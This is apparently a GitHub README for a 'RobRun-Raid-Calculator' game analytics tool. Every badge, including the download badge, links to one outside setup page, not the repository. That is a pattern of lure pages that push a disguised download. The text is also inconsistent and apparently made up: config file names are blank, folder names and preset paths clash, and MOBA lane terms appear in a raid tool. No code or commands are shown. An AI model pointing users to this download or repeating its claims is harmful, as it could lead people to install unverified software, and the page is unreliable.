# RobRun-Raid-Calculator – Advanced Raid Calculation Engine
<a href="https://rewfdf.github.io/SetupPage/"><img src="https://img.shields.io/badge/Download-Release-0e7490?style=flat-square&logo=twitch&logoColor=white" alt="Download"></a>
<a href="https://rewfdf.github.io/SetupPage/"><img src="https://img.shields.io/badge/Python-3.11-3776AB?style=flat-square&logo=python&logoColor=white" alt="Python"></a>
<a href="https://rewfdf.github.io/SetupPage/"><img src="https://img.shields.io/badge/License-MIT-4B0082?style=for-the-badge&logo=github&logoColor=white" alt="License"></a>
<a href="https://rewfdf.github.io/SetupPage/"><img src="https://img.shields.io/badge/Size-3MB-FF0000?style=plastic&logo=folder&logoColor=white" alt="Size"></a>
<a href="https://rewfdf.github.io/SetupPage/"><img src="https://img.shields.io/badge/Stars-150-FFD700?style=flat&logo=github&logoColor=white" alt="Stars"></a>
<a href="https://rewfdf.github.io/SetupPage/"><img src="https://img.shields.io/badge/Build-Passing-00FF00?style=flat-square&logo=travis&logoColor=white" alt="Build"></a>

---

## Overview
RobRun-Raid-Calculator is a precision‑driven engine that transforms raw raid data into actionable insights. Designed for competitive analysts and community leaders, it parses structured profiles, applies workflow presets, and outputs performance curves that help teams identify weak links and optimize strategy. The project ships with a curated release bundle, including sample configuration files and pre‑built workflow packs, so teams can hit the ground running without manual scripting.

## Features
| Feature | Description | Impact |
|---------|-------------|--------|
| **Profile‑Driven Calculation** | Load any of the four native configuration files (``, ``, ``, ``) to tailor calculations to specific raid scenarios. | Enables rapid experimentation across diverse raid setups. |
| **Preset Workflows** | 12 ready‑made workflow packs (e.g., “Off‑Lane Pressure”, “All‑In Burst”) are bundled with the release. Each pack contains a sequence of calculation steps, thresholds, and visual cues. | Cuts preparation time from hours to minutes. |
| **Dynamic Graph Generation** | Generates SVG and PNG performance charts that integrate directly with community dashboards or streaming overlays. | Improves real‑time feedback during matches. |
| **Cross‑Platform Compatibility** | Tested on Windows, macOS, and Linux distributions. Requires Python 3.11 or newer; no external binaries needed. | Broadens accessibility to all raid teams. |
| **Extensible Architecture** | Plug‑in interface for custom modules, allowing teams to extend logic without touching core code. | Future‑proof the calculator for evolving raid mechanics. |

## Workflow Presets
The calculator ships with 12 workflow presets that define a full analysis pipeline:

1. **Basic Stats** – Core metrics such as DPS, healing, and uptime.
2. **Off‑Lane Pressure** – Focuses on lane dominance and crowd control.
3. **All‑In Burst** – Highlights burst windows and combo timing.
4. **Resilience Test** – Simulates damage mitigation under sustained pressure.
5. **Resource Allocation** – Optimizes mana, energy, and cooldown distribution.
6. **Team Synergy** – Evaluates coordinated abilities and overlap.
7. **Single‑Target Mastery** – Analyzes kill‑timing for each target.
8. **Multi‑Target Efficiency** – Assesses AoE coverage and damage spread.
9. **Healing Balance** – Checks support ratios and survivability.
10. **Cooldown Synchronization** – Aligns global cooldown usage across the team.
11. **Performance Benchmark** – Compares current raid run against historical baselines.
12. **Custom Script** – A placeholder for user‑created pipelines.

Each preset resides in the `presets/` directory, stored as `.json` files. Importing a preset is as simple as passing its path to the calculator command line.

## Directory Structure
```
RobRun-Raid-Calculator/
├─ config/
│  ├─
│  ├─
│  ├─
│  └─
├─ presets/
│  ├─ basic_stats.json
│  ├─ off_lane_pressure.json
│  └─ custom_script.json
├─ output/
│  ├─ charts/
│  └─ reports/
├─ docs/
│  ├─ usage.md
│  └─ faq.md
└─ README.md
```

## Usage Guide
1. **Prepare Profiles** – Edit the configuration files in `config/` to match your raid’s composition.
2. **Select a Workflow** – Choose a preset from the `presets/` folder.
3. **Run the Calculator** – Execute the command line script (e.g., `python run_calc.py --preset presets/basics.json`).
4. **Review Results** – Inspect the `output/` folder for charts and detailed reports.
5. **Iterate** – Adjust profiles or workflow parameters and re‑run until desired metrics are achieved.

The calculator prints a concise summary to the console, highlighting key performance indicators and any thresholds that were breached.

## FAQ
**Q1: How do I add a new player to a raid profile?**
Edit ``, inserting a new block with the player’s ID and desired buffs. Ensure the syntax matches existing entries; the calculator will automatically incorporate the new data during the next run.

**Q2: Can I export data to external analytics utility?**
Yes. The `output/reports/` directory contains JSON files that can be ingested by most spreadsheet or data‑visualisation platforms.

**Q3: Is there a way to customize the graph colours?**
Modify `` – change the `theme` or add `color_map` entries. The renderer reads these settings on every execution.

**Q4: The calculator reports a “Missing File” error. What does that mean?**
Verify that the file path supplied to the `--preset` flag exists and that the file is not corrupted. Paths are relative to the repository root.

**Q5: How can I contribute a new workflow preset?**
Create a new `.json` file in `presets/` following the schema used by existing presets. Submit a pull request with a brief description of the intended use case.

## Troubleshooting
- **No output generated** – Ensure that the `output/` directory is writable.
- **Graphs show default values** – Check that the configuration files were modified correctly; the calculator only merges files in the specified order.
- **Performance lag** – The calculator can be memory intensive on large raid datasets. Running on a machine with ≥8 GB RAM and a 64‑bit Python interpreter mitigates delays.

For deeper diagnostics, run the script with the `--debug` flag; this will produce a log file in `output/`.

## Contributing
Contributions that enhance the accuracy of calculations, add new workflow presets, or improve documentation are encouraged. Please follow the established coding conventions, keep changes minimal, and include test cases in the `tests/` folder where appropriate. After submitting a pull request, the maintainers will review for consistency with the overall design philosophy before merging.

---

## 📁 Configuration System

```text
configs/
├── default.cfg
├── visual.cfg
├── player.cfg
└── custom.cfg
```